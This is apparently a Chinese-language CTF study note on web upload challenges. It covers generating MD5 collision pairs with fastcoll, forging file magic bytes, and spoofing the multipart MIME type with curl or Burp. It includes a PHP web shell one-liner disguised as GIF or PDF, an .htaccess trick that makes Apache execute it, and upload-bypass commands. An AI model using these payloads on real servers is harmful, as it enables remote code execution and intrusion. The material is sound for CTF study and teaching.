# Web笔记15｜MD5 碰撞 & 假文件构造（fastcoll + MIME 伪造）

> 适用：上传题要求「两个文件内容不同但 MD5 相同」；文件类型/魔数校验绕过
> 配套：`my_learning/web/md5coll/`（fastcoll.exe + 现成碰撞对 m1/m2 + fastcoll使用说明书.html）
> 实战题：qsnctf「It is DT's day」（flag 已拿）｜ 本笔记所有命令均已实测

---

## 〇、一句话心法

**服务器校验「像不像 PDF」和「MD5 一样不一样」，靠的是可伪造的输入（MIME type）和可碰撞的算法（MD5）——两个都能骗。**

---

## 一、MD5 碰撞是什么

- **定义**：两个**不同内容**的文件，算出来的 **MD5 完全相同**。
- **为什么存在**：MD5 输出只有 128 位，输入空间远大于输出空间，必然有碰撞（2004 年王小云给出构造法）。
- **为什么 fastcoll 几秒能算出来**：MD5 是**分段计算**的（像接力赛一棒一棒跑）。fastcoll 找到两条「路线不同、但跑到接力点时内部状态完全相同」的路径。
  ```
  文件1: 前缀(相同) ──► 碰撞块A(不同路线) ──► 到接力点位置相同 ──► 后续相同 → MD5 相同
  文件2: 前缀(相同) ──► 碰撞块B(不同路线) ──► 到接力点位置相同 ──► 后续相同 → MD5 相同
  ```
- **推论（重要）**：碰撞块之后内部状态已相同 → **后缀随便加，MD5 依然相等**。

---

## 二、fastcoll 用法（核心）

```bash
fastcoll.exe -p 前缀文件 -o 输出1 输出2
```

| 参数 | 全称 | 作用 |
|---|---|---|
| `-p 文件` | --prefixfile | 前缀文件，内容原样复制进两个输出文件开头 |
| `-o f1 f2` | --out | 输出两个文件名（必须最后，正好两个） |
| `-i 值` | --ihv | 自定义初始值（一般不用） |
| `-q` | --quiet | 安静模式 |

```bash
# 完整流程
printf 'hello' > prefix.txt                 # ① 写前缀（内容随便）
fastcoll.exe -p prefix.txt -o m1.bin m2.bin # ② 生成（几秒~十几秒）
md5sum m1.bin m2.bin                        # ③ 验证：两行 MD5 一样 = 成功
```

**能力边界**：
- ✅ 能：前缀/后缀任意内容（PHP 代码、%PDF 魔数都行）；几秒出结果；后缀生成后手动 `>>` 追加仍等 MD5
- ❌ 不能：两个文件**只有碰撞块不同**；碰撞块是随机垃圾字节（不可控）；做不了「完全不同的两个文件同 MD5」（那是 chosen-prefix，代价极大）

---

## 三、上传题「报错 = 校验规则说明书」（黑盒推断法）

**套路**：每次只改一个变量做对照实验，把报错记下来，拼出服务端校验链，再逐个击破。

以 DT's day 为例，三个报错拼出三道校验：

| 实验 | 报错 | 推断的校验 |
|---|---|---|
| 传两个 txt | `Not a PDF!` | 有「必须是 PDF」校验 |
| 传同一个文件两次 | `Files are not different!` | 内容必须不同 |
| 传两个内容不同的假 PDF | `do you konw what is MD5 Collision?` | MD5 必须相同 |

**校验顺序**：不同 → PDF → MD5（可用报错先后反推）。

---

## 四、假文件构造（魔数欺骗）

**原理**：文件类型检测靠「魔数」（开头几个字节），检测方只看开头，其它随便塞。

```bash
# 构造「开头像 PDF、后面是 PHP 代码」的假文件
printf '%%PDF-1.4\n<?php echo 1; ?>' > p1.pdf
#   %% = 一个 % （printf 转义）  \n = 换行   单引号 = 原样不展开
```

**常用魔数速查**：

| 想伪装成 | 开头字节 |
|---|---|
| PDF | `%PDF-` |
| GIF 图片 | `GIF89a` |
| PNG | `\x89PNG\r\n\x1a\n` |
| JPEG | `FF D8 FF` |

图片马组合拳：`printf 'GIF89a\n<?php system($_GET["c"]); ?>' > shell.gif` + .htaccess 让 Apache 把 .gif 当 PHP 解析。

---

## 五、MIME 伪造（上传题最骚的点）

- 服务器判断「是不是 PDF」用的 `$_FILES['x']['type']` **来自浏览器的 multipart 表单，可以随便改**。
- **curl 伪造**：`-F "d1=@m1.bin;filename=a.pdf;type=application/pdf"`（`type=` 就是 part 的 Content-Type）
- **Burp 伪造**：把 part 的 `Content-Type: text/plain` 改成 `Content-Type: application/pdf`（注意是 **application/pdf** 不是 text/pdf）
- 实测结论：**内容完全不像 PDF 也能过**（DT's day 纯文本碰撞对 + 伪造 MIME 直接出 flag）
- 教训：和「前端校验=纸老虎」同理——**信任客户端输入（MIME）= 漏洞**。但注意这只是过了「是 PDF」那道校验，MD5 那道还得靠碰撞对。

---

## 六、扩展名无关论

- fastcoll 对输入输出**不关心格式，只认字节**：输入前缀任意文件，输出扩展名随便写（.bin/.txt/.pdf 都一样，内容完全相同）。
- 为什么输出习惯叫 `.bin`：碰撞块含 `\0` 等不可打印字节，是二进制文件，叫 bin 是诚实命名（txt 打开是乱码）。
- 做题时扩展名怎么起，取决于服务器怎么处理：骗 MIME → 命名配合 `type=`；要被当 PHP 执行 → `.php`；只过 MD5 判重 → 随便。

---

## 七、坑（实测踩过）

1. **curl 按文件名猜 MIME**：`filename=shell.php` 会被发成 `application/x-php` → 吃「Not a PDF!」。解法：显式 `;type=application/pdf`。
2. **碰撞块是垃圾字节**：文件被当 PHP 解析时，代码放**前缀**并用 `?>` 闭合，后面的垃圾只会当 HTML 输出。
3. **运行时间波动**：5~16 秒都正常（随机过程），别以为卡死。
4. **杀软报警**：fastcoll 是碰撞生成器，双刃工具，加信任即可。
5. **`c${IFS}at` 之类别用在文件题**：这是 RCE 绕过，不同赛道（见笔记14）。

---

## 八、速查卡（贴墙用）

```bash
# 假 PDF（带 PHP）
printf '%%PDF-1.4\n<?php system($_GET["c"]); ?>' > shell.pdf

# 生成碰撞对
fastcoll.exe -p prefix.txt -o m1.bin m2.bin
md5sum m1.bin m2.bin                # 两行一样 = 成功

# 上传（伪造 MIME）
curl -F "d1=@m1.bin;filename=a.pdf;type=application/pdf" \
     -F "d2=@m2.bin;filename=b.pdf;type=application/pdf" URL
```

---

## 九、关联

- 实战：`WP-[qsnctf]DT上传-MD5碰撞.md`（三道校验推导全过程 + flag）
- 同族：PHP 弱比较 `md5(a)==md5(b)` 用 0e 魔法串；强比较用数组绕过或碰撞对
- 相邻：`Web笔记14-RCE过滤绕过`（命令注入是另一个赛道，别混）
- 工具说明书：`md5coll/fastcoll使用说明书.html`（图文版）
